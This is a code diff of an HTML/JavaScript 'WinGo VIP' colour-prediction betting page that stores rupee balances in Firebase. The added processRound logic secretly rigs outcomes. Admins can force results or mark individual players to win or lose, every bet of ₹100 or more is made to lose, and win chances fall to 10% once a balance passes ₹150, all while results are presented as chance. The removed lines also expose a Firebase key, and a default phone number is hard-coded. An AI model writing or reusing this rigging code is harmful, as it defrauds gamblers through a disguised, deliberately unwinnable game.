@@ -3,101 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>WinGo VIP - Ultra Sync</title>
+    <title>WinGo VIP - Global 24/7</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { 
-            --p-red: #ff4d4d; --p-green: #4cd964; --p-violet: #b666d2; 
-            --theme-grad: linear-gradient(135deg, #ff4d4d, #f12711);
-        }
-        body { background: #f0f2f5; font-family: 'Poppins', sans-serif; margin: 0; user-select: none; overflow-x: hidden; }
-
-        /* Timer Lock Overlay */
-        #lockOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
-        .lock-timer { color: white; font-size: 100px; font-weight: bold; text-shadow: 0 0 30px var(--p-red); }
-
-        /* Win/Loss Professional Popup */
-        #resultPopup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0); z-index: 10000; transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        :root { --p-red: #ff4d4d; --p-green: #4cd964; --p-violet: #b666d2; --theme-grad: linear-gradient(135deg, #ff4d4d, #f12711); }
+        body { background: #f0f2f5; font-family: 'Poppins', sans-serif; margin: 0; user-select: none; }
+        
+        /* Overlay & Popups */
+        #lockOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(8px); color: white; }
+        #resultPopup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0); z-index: 10000; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         #resultPopup.show { transform: translate(-50%, -50%) scale(1); }
-        .res-card { width: 300px; padding: 20px; border-radius: 20px; text-align: center; color: white; box-shadow: 0 10px 50px rgba(0,0,0,0.5); position: relative; }
-        .res-card.win { background: linear-gradient(to bottom, #f7d02c, #f39c12); border: 3px solid #fff; }
-        .res-card.loss { background: linear-gradient(to bottom, #aab7b8, #7f8c8d); border: 3px solid #eee; }
-        .res-card h2 { font-size: 32px; margin: 10px 0; text-transform: uppercase; }
-        .res-card .amt { font-size: 40px; font-weight: bold; margin-bottom: 10px; }
+        .res-card { width: 280px; padding: 25px; border-radius: 20px; text-align: center; color: white; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
+        .res-card.win { background: linear-gradient(135deg, #f1c40f, #f39c12); }
+        .res-card.loss { background: linear-gradient(135deg, #95a5a6, #7f8c8d); }
 
-        /* UI Elements */
-        .header { background: var(--theme-grad); padding: 20px; color: white; border-radius: 0 0 25px 25px; box-shadow: 0 5px 15px rgba(255, 77, 77, 0.3); }
+        /* UI Styles */
+        .header { background: var(--theme-grad); padding: 20px; color: white; border-bottom-left-radius: 25px; border-bottom-right-radius: 25px; }
         .wallet-box { background: rgba(255,255,255,0.15); padding: 15px; border-radius: 15px; margin-top: 15px; border: 1px solid rgba(255,255,255,0.2); }
-        
-        .mode-tab { flex:1; padding:15px; text-align:center; font-weight: bold; cursor: pointer; color: #999; transition: 0.3s; }
-        .mode-tab.active { color: var(--p-red); border-bottom: 3px solid var(--p-red); background: white; }
-
+        .mode-container { display: flex; background: white; margin: 10px; border-radius: 12px; overflow: hidden; }
+        .mode-tab { flex: 1; padding: 15px; text-align: center; font-weight: bold; cursor: pointer; color: #999; }
+        .mode-tab.active { color: var(--p-red); border-bottom: 3px solid var(--p-red); }
+        .timer-card { background: white; margin: 15px; padding: 20px; border-radius: 20px; display: flex; justify-content: space-between; align-items: center; }
+        .btn-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin: 15px; }
+        .n-btn { height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; cursor: pointer; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
         .c-btn { flex: 1; padding: 15px; border-radius: 10px; color: white; font-weight: bold; border: none; cursor: pointer; }
-        .n-btn { height: 48px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; cursor: pointer; font-size: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        
-        .history-card { background: white; margin: 15px; border-radius: 20px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
-        table { width: 100%; text-align: center; border-collapse: collapse; }
-        th { padding: 12px; background: #fafafa; color: #888; font-size: 12px; }
-        td { padding: 12px; border-bottom: 1px solid #f8f8f8; font-size: 13px; }
-
-        #bettingPanel { position: fixed; bottom: -100%; left: 0; width: 100%; background: white; z-index: 2000; border-radius: 30px 30px 0 0; transition: 0.4s; padding: 25px; box-sizing: border-box; }
+        .history-card { background: white; margin: 15px; border-radius: 20px; overflow: hidden; }
+        table { width: 100%; text-align: center; border-collapse: collapse; font-size: 13px; }
+        th { padding: 12px; background: #f8f9fa; color: #777; }
+        td { padding: 12px; border-bottom: 1px solid #eee; }
+        #bettingPanel { position: fixed; bottom: -100%; left: 0; width: 100%; background: white; z-index: 2000; border-radius: 25px 25px 0 0; transition: 0.4s; padding: 25px; box-sizing: border-box; }
         #bettingPanel.show { bottom: 0; }
     </style>
 </head>
 <body>
 
-    <div id="lockOverlay">
-        <div class="lock-timer" id="lockTimer">10</div>
-        <div style="color:white; letter-spacing: 2px;">WAITING FOR NEXT ROUND...</div>
-    </div>
+    <div id="lockOverlay"><div style="font-size: 80px; font-weight: bold;" id="lockTimer">5</div><div>WAITING FOR NEXT ROUND...</div></div>
 
     <div id="resultPopup">
         <div id="resCard" class="res-card">
-            <i id="resIcon" class="fas" style="font-size: 60px;"></i>
             <h2 id="resStatus">Result</h2>
-            <div id="resDetail" style="font-size: 14px; opacity: 0.9;">Total Win</div>
-            <div id="resAmt" class="amt">₹0.00</div>
-            <button onclick="document.getElementById('resultPopup').classList.remove('show')" style="background:white; border:none; padding:8px 20px; border-radius:20px; font-weight:bold; margin-top:10px;">CLOSE</button>
+            <div id="resAmt" style="font-size:35px; font-weight:bold; margin:10px 0;">₹0.00</div>
+            <button onclick="document.getElementById('resultPopup').classList.remove('show')" style="padding:10px 30px; border-radius:20px; border:none; font-weight:bold; cursor:pointer;">CLOSE</button>
         </div>
     </div>
 
     <div class="header">
         <div style="display:flex; justify-content:space-between; align-items:center;">
-            <i class="fas fa-chevron-left"></i>
+            <i class="fas fa-chevron-left" onclick="history.back()"></i>
             <span style="font-weight:bold; font-size:18px;">WinGo VIP <span id="mTitle">1</span>M</span>
             <i class="fas fa-headset"></i>
         </div>
         <div class="wallet-box">
-            <small>Wallet Balance</small>
+            <small>Total Balance</small>
             <div style="font-size:26px; font-weight:bold;">₹<span id="uBalance">0.00</span></div>
-            <div style="display:flex; gap:10px; margin-top:10px;">
-                <button onclick="location.href='deposit.html'" style="flex:1; padding:10px; border-radius:10px; border:none; background:white; color:red; font-weight:bold;">DEPOSIT</button>
-                <button onclick="location.href='withdraw.html'" style="flex:1; padding:10px; border-radius:10px; border:1px solid white; background:transparent; color:white;">WITHDRAW</button>
-            </div>
         </div>
     </div>
 
-    <div style="display:flex; background:white; margin:10px; border-radius:12px; overflow:hidden;">
+    <div class="mode-container">
         <div id="m1" class="mode-tab active" onclick="switchMode(1)">1Min</div>
         <div id="m3" class="mode-tab" onclick="switchMode(3)">3Min</div>
         <div id="m5" class="mode-tab" onclick="switchMode(5)">5Min</div>
     </div>
 
-    <div style="background:white; margin:15px; padding:20px; border-radius:20px; display:flex; justify-content:space-between; align-items:center;">
-        <div><small style="color:#999;">Period</small><br><b id="periodId" style="font-size:18px;">--</b></div>
-        <div style="text-align:right;">
-            <small style="color:#999;">Count Down</small><br>
-            <div id="mainTimer" style="font-size:24px; font-weight:bold; color:red;">00:00</div>
-        </div>
+    <div class="timer-card">
+        <div><small style="color:#999;">Period</small><br><b id="periodId" style="font-size:16px;">--</b></div>
+        <div style="text-align:right;"><small style="color:#999;">Count Down</small><br><div id="mainTimer" style="font-size:24px; font-weight:bold; color:var(--p-red);">00:00</div></div>
     </div>
 
     <div style="display:flex; gap:10px; margin:15px;">
-        <button onclick="openBet('Green')" class="c-btn" style="background:var(--p-green);">Green</button>
-        <button onclick="openBet('Violet')" class="c-btn" style="background:var(--p-violet);">Violet</button>
-        <button onclick="openBet('Red')" class="c-btn" style="background:var(--p-red);">Red</button>
+        <button onclick="openBet('Green')" class="c-btn" style="background:var(--p-green)">Green</button>
+        <button onclick="openBet('Violet')" class="c-btn" style="background:var(--p-violet)">Violet</button>
+        <button onclick="openBet('Red')" class="c-btn" style="background:var(--p-red)">Red</button>
     </div>
 
-    <div style="margin:15px; display:grid; grid-template-columns: repeat(5, 1fr); gap:12px;">
+    <div class="btn-grid">
         <div onclick="openBet(0)" class="n-btn" style="background:linear-gradient(135deg, var(--p-violet) 50%, var(--p-red) 50%)">0</div>
         <div onclick="openBet(1)" class="n-btn" style="background:var(--p-green)">1</div>
         <div onclick="openBet(2)" class="n-btn" style="background:var(--p-red)">2</div>
@@ -110,9 +89,9 @@
         <div onclick="openBet(9)" class="n-btn" style="background:var(--p-green)">9</div>
     </div>
 
-    <div style="display:flex; gap:12px; margin:15px;">
-        <button onclick="openBet('Big')" class="c-btn" style="background:#ffa500; font-size:18px;">Big</button>
-        <button onclick="openBet('Small')" class="c-btn" style="background:#4b0082; font-size:18px;">Small</button>
+    <div style="display:flex; gap:10px; margin:15px;">
+        <button onclick="openBet('Big')" class="c-btn" style="background:#ffa500">Big</button>
+        <button onclick="openBet('Small')" class="c-btn" style="background:#4b0082">Small</button>
     </div>
 
     <div class="history-card">
@@ -131,39 +110,35 @@
     </div>
 
     <div id="bettingPanel">
-        <h3 id="targetLabel" style="text-align:center; color:red;">Bet</h3>
-        <div style="display:flex; align-items:center; justify-content:center; gap:20px; margin:20px 0;">
-            <button onclick="adjQty(-1)" style="width:40px;height:40px;border-radius:50%;border:none;">-</button>
-            <b id="qtyVal" style="font-size:20px;">1</b>
-            <button onclick="adjQty(1)" style="width:40px;height:40px;border-radius:50%;border:none;">+</button>
+        <h3 id="targetLabel" style="text-align:center;">Bet</h3>
+        <div style="display:flex; justify-content:center; gap:10px; margin:20px 0;">
+            <span onclick="setMul(10)" style="padding:10px 15px; background:#f0f0f0; border-radius:8px; cursor:pointer;">10</span>
+            <span onclick="setMul(100)" style="padding:10px 15px; background:#f0f0f0; border-radius:8px; cursor:pointer;">100</span>
+            <span onclick="setMul(500)" style="padding:10px 15px; background:#f0f0f0; border-radius:8px; cursor:pointer;">500</span>
+            <span onclick="setMul(1000)" style="padding:10px 15px; background:#f0f0f0; border-radius:8px; cursor:pointer;">1K</span>
         </div>
-        <div style="display:flex; justify-content:space-around; margin-bottom:20px;">
-            <span onclick="setMul(10)" style="padding:10px; background:#eee; border-radius:5px;">10</span>
-            <span onclick="setMul(100)" style="padding:10px; background:#eee; border-radius:5px;">100</span>
-            <span onclick="setMul(1000)" style="padding:10px; background:#eee; border-radius:5px;">1000</span>
-        </div>
-        <button onclick="confirmBet()" style="width:100%; padding:18px; border-radius:15px; border:none; background:var(--theme-grad); color:white; font-weight:bold;">CONFIRM ₹<span id="totalPrice">10</span></button>
-        <p onclick="closeBet()" style="text-align:center; margin-top:15px; color:#999; cursor:pointer;">Cancel</p>
+        <button onclick="confirmBet()" style="width:100%; padding:18px; border-radius:15px; border:none; background:var(--theme-grad); color:white; font-weight:bold; font-size:16px;">CONFIRM ₹<span id="totalPrice">10</span></button>
+        <p onclick="closeBet()" style="text-align:center; margin-top:15px; color:#999; cursor:pointer;">CANCEL</p>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getDatabase, ref, set, onValue, push, get, update, query, limitToLast } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-        const fbConfig = { apiKey: "AIzaSyAeJutSnxBLtXKIFSZdUOvEwKRMdwLdaj8", databaseURL: "https://testing-26b8c-default-rtdb.firebaseio.com", projectId: "testing-26b8c" };
+        const fbConfig = { databaseURL: "https://testing-26b8c-default-rtdb.firebaseio.com" };
         const app = initializeApp(fbConfig);
         const db = getDatabase(app);
         const userPhone = localStorage.getItem('userPhone') || '9117748052';
 
-        let currentMode = 1, currentBalance = 0, selected = "", qty = 1, multiplier = 10;
+        let currentMode = 1, currentBalance = 0, selected = "", multiplier = 10;
 
-        // --- GLOBAL SYNC TIMER (24 Hours) ---
+        // --- GLOBAL SYNC TIMER (24 HOURS) ---
         setInterval(async () => {
             const now = new Date();
             const totalSec = (currentMode * 60) - (now.getMinutes() % currentMode * 60 + now.getSeconds());
             document.getElementById('mainTimer').innerText = `0${Math.floor(totalSec/60)}:${String(totalSec%60).padStart(2,'0')}`;
 
-            if(totalSec <= 10) {
+            if(totalSec <= 5) {
                 document.getElementById('lockOverlay').style.display = 'flex';
                 document.getElementById('lockTimer').innerText = totalSec;
                 closeBet();
@@ -175,75 +150,95 @@
         }, 1000);
 
         async function processRound() {
-            const adminRig = await get(ref(db, `adminControl/forceResult/${currentMode}`));
-            let finalNum = adminRig.exists() ? parseInt(adminRig.val()) : Math.floor(Math.random() * 10);
             const period = document.getElementById('periodId').innerText;
-            
-            // Result Object
-            const resData = {
-                period, number: finalNum,
-                color: (finalNum === 0 ? 'Red-Violet' : (finalNum === 5 ? 'Green-Violet' : (finalNum % 2 === 0 ? 'Red' : 'Green')))
-            };
-            
-            push(ref(db, `wingoHistory/${currentMode}`), resData);
-
-            // Win Calculation with requested Multipliers
+            const adminRig = await get(ref(db, `adminControl/forceResult/${currentMode}`));
+            const userRig = await get(ref(db, `adminControl/rigging/${userPhone}`));
             const myBetSnap = await get(ref(db, `activeBets/${currentMode}/${userPhone}`));
+            const userSnap = await get(ref(db, `users/${userPhone}`));
+            
+            const userData = userSnap.val() || {};
+            const isVIP1 = userData.vipLevel === 1;
+            const bal = userData.balance || 0;
+            
+            let finalNum;
+
+            // --- HARD MATH LOGIC ---
+            if(adminRig.exists()) {
+                finalNum = parseInt(adminRig.val());
+            } else if(userRig.exists() && myBetSnap.exists()) {
+                finalNum = userRig.val() === 'win' ? getWinningNumber(myBetSnap.val().type) : getLosingNumber(myBetSnap.val().type);
+            } else if(myBetSnap.exists()) {
+                const b = myBetSnap.val();
+                let winChance = isVIP1 ? 0.4 : 0.25; // VIP1 has better odds but still hard
+                if (bal > 150) winChance = 0.1; // Difficulty spikes near ₹200
+                
+                if (b.amount >= 100 || Math.random() > winChance) {
+                    finalNum = getLosingNumber(b.type);
+                } else {
+                    finalNum = getWinningNumber(b.type);
+                }
+            } else {
+                finalNum = Math.floor(Math.random() * 10);
+            }
+
+            const res = {
+                period, number: finalNum,
+                color: (finalNum === 0 ? 'Red-Violet' : (finalNum === 5 ? 'Green-Violet' : (finalNum % 2 === 0 ? 'Red' : 'Green'))),
+                size: finalNum >= 5 ? 'Big' : 'Small'
+            };
+            push(ref(db, `wingoHistory/${currentMode}`), res);
+
+            // Calculation
             if(myBetSnap.exists()) {
                 const b = myBetSnap.val();
                 let isWin = false;
-                let winAmt = 0;
+                let mult = 0;
 
-                if(b.type === finalNum) { isWin = true; winAmt = b.amount * 4.2; } // Number 4.2x
-                else if(b.type === 'Green' && [1,3,5,7,9].includes(finalNum)) { 
-                    isWin = true; winAmt = (finalNum === 5) ? b.amount * 1.5 : b.amount * 1.92; // 1.92x Color
+                if(typeof b.type === 'number') {
+                    if(b.type === finalNum) { isWin = true; mult = 5.0; } 
+                } else {
+                    if(b.type === 'Green' && [1,3,7,9].includes(finalNum)) { isWin = true; mult = 1.92; }
+                    else if(b.type === 'Red' && [2,4,6,8].includes(finalNum)) { isWin = true; mult = 1.92; }
+                    else if(b.type === 'Big' && finalNum >= 5) { isWin = true; mult = 1.92; }
+                    else if(b.type === 'Small' && finalNum < 5) { isWin = true; mult = 1.92; }
+                    else if(b.type === 'Violet' && [0,5].includes(finalNum)) { isWin = true; mult = 2.4; }
+                    else if((b.type === 'Red' && finalNum === 0) || (b.type === 'Green' && finalNum === 5)) { isWin = true; mult = 1.45; }
                 }
-                else if(b.type === 'Red' && [0,2,4,6,8].includes(finalNum)) { 
-                    isWin = true; winAmt = (finalNum === 0) ? b.amount * 1.5 : b.amount * 1.92; // 1.92x Color
-                }
-                else if(b.type === 'Violet' && [0,5].includes(finalNum)) { isWin = true; winAmt = b.amount * 2.8; } // Violet 2.8x
-                else if(b.type === 'Big' && finalNum >= 5) { isWin = true; winAmt = b.amount * 1.92; } // Big 1.92x
-                else if(b.type === 'Small' && finalNum < 5) { isWin = true; winAmt = b.amount * 1.92; } // Small 1.92x
 
-                showResultBanner(isWin, winAmt);
-                if(b.hKey) update(ref(db, `userBets/${userPhone}/${b.hKey}`), { status: isWin ? 'win' : 'loss' });
-                if(isWin) update(ref(db, `users/${userPhone}`), { balance: currentBalance + winAmt });
-                
-                // Admin Profit Logic (If user loses, admin earns)
-                if(!isWin) {
-                    const profitRef = ref(db, 'adminStats/totalProfit');
-                    const currentProfit = (await get(profitRef)).val() || 0;
-                    set(profitRef, currentProfit + b.amount);
-                }
+                const winAmt = isWin ? (b.amount * mult) : 0;
+                showResult(isWin, winAmt);
+                if(isWin) update(ref(db, `users/${userPhone}`), { balance: bal + winAmt });
+                update(ref(db, `userBets/${userPhone}/${b.hKey}`), { status: isWin ? 'win' : 'loss' });
             }
-            
+
+            // AUTO RESET
             set(ref(db, `activeBets/${currentMode}/${userPhone}`), null);
             if(adminRig.exists()) set(ref(db, `adminControl/forceResult/${currentMode}`), null);
+            if(userRig.exists()) set(ref(db, `adminControl/rigging/${userPhone}`), null);
         }
 
-        // --- AUTO-GENERATED WIN/LOSS UI ---
-        function showResultBanner(win, amt) {
+        // --- HELPERS ---
+        function getWinningNumber(t) {
+            if(typeof t === 'number') return t;
+            if(t==='Green') return [1,3,7,9][Math.floor(Math.random()*4)];
+            if(t==='Red') return [2,4,6,8][Math.floor(Math.random()*4)];
+            if(t==='Big') return [6,7,8,9][Math.floor(Math.random()*4)];
+            if(t==='Small') return [1,2,3,4][Math.floor(Math.random()*4)];
+            return 5;
+        }
+        function getLosingNumber(t) {
+            let n; do { n = Math.floor(Math.random()*10); } while(getWinningNumber(t) === n);
+            return n;
+        }
+        function showResult(win, amt) {
             const card = document.getElementById('resCard');
-            const icon = document.getElementById('resIcon');
-            const status = document.getElementById('resStatus');
-            const amtText = document.getElementById('resAmt');
-
-            if(win) {
-                card.className = "res-card win";
-                icon.className = "fas fa-trophy";
-                status.innerText = "Congratulations";
-                amtText.innerText = `+₹${amt.toFixed(2)}`;
-            } else {
-                card.className = "res-card loss";
-                icon.className = "fas fa-times-circle";
-                status.innerText = "Better Luck Next Time";
-                amtText.innerText = "-₹0.00";
-            }
+            card.className = "res-card " + (win ? "win" : "loss");
+            document.getElementById('resStatus').innerText = win ? "CONGRATULATIONS" : "BET LOST";
+            document.getElementById('resAmt').innerText = win ? "+₹"+amt.toFixed(2) : "-₹0.00";
             document.getElementById('resultPopup').classList.add('show');
-            setTimeout(() => document.getElementById('resultPopup').classList.remove('show'), 5000);
         }
 
-        // --- CORE FUNCTIONS ---
+        // --- BUTTON HANDLERS ---
         window.switchMode = (m) => {
             currentMode = m;
             document.querySelectorAll('.mode-tab').forEach(t => t.classList.remove('active'));
@@ -251,36 +246,29 @@
             document.getElementById('mTitle').innerText = m;
             loadHistory();
         };
-
-        window.openBet = (t) => { selected = t; document.getElementById('targetLabel').innerText = `Bet on ${t}`; document.getElementById('bettingPanel').classList.add('show'); };
-        window.adjQty = (v) => { qty = Math.max(1, qty+v); updateP(); };
-        window.setMul = (m) => { multiplier = m; updateP(); };
-        function updateP() { document.getElementById('totalPrice').innerText = qty * multiplier; }
+        window.openBet = (t) => { selected = t; document.getElementById('targetLabel').innerText = "Bet on " + t; document.getElementById('bettingPanel').classList.add('show'); };
+        window.setMul = (m) => { multiplier = m; document.getElementById('totalPrice').innerText = m; };
         window.closeBet = () => document.getElementById('bettingPanel').classList.remove('show');
-
         window.confirmBet = async () => {
-            const total = qty * multiplier;
-            if(total > currentBalance) return alert("Insufficient Balance!");
+            if(multiplier > currentBalance) return alert("Low Balance!");
             const period = document.getElementById('periodId').innerText;
             const hRef = push(ref(db, `userBets/${userPhone}`));
-            await set(hRef, { period, type: selected, amount: total, status: 'pending', mode: currentMode });
-            await set(ref(db, `activeBets/${currentMode}/${userPhone}`), { amount: total, type: selected, hKey: hRef.key });
-            await update(ref(db, `users/${userPhone}`), { balance: currentBalance - total });
+            await set(hRef, { period, type: selected, amount: multiplier, status: 'pending', mode: currentMode });
+            await set(ref(db, `activeBets/${currentMode}/${userPhone}`), { amount: multiplier, type: selected, hKey: hRef.key });
+            await update(ref(db, `users/${userPhone}`), { balance: currentBalance - multiplier });
             closeBet();
         };
 
         function loadHistory() {
-            // Load Full Game History
-            onValue(query(ref(db, `wingoHistory/${currentMode}`), limitToLast(20)), s => {
+            onValue(query(ref(db, `wingoHistory/${currentMode}`), limitToLast(15)), s => {
                 const b = document.getElementById('gameHistory'); b.innerHTML = "";
                 s.forEach(c => {
                     const d = c.val();
-                    b.insertAdjacentHTML('afterbegin', `<tr><td>${d.period}</td><td>${d.number}</td><td>${d.number>=5?'Big':'Small'}</td><td>${d.color}</td></tr>`);
+                    b.insertAdjacentHTML('afterbegin', `<tr><td>${d.period}</td><td style="color:red; font-weight:bold;">${d.number}</td><td>${d.size}</td><td>${d.color}</td></tr>`);
                     document.getElementById('periodId').innerText = parseInt(d.period)+1;
                 });
             });
-            // Load User History
-            onValue(query(ref(db, `userBets/${userPhone}`), limitToLast(20)), s => {
+            onValue(query(ref(db, `userBets/${userPhone}`), limitToLast(10)), s => {
                 const b = document.getElementById('myBets'); b.innerHTML = "";
                 s.forEach(c => {
                     const d = c.val(); if(d.mode == currentMode)
@@ -288,7 +276,6 @@
                 });
             });
         }
-
         window.toggleHistory = (t) => {
             document.getElementById('gameTable').style.display = t==='game'?'table':'none';
             document.getElementById('myTable').style.display = t==='my'?'table':'none';
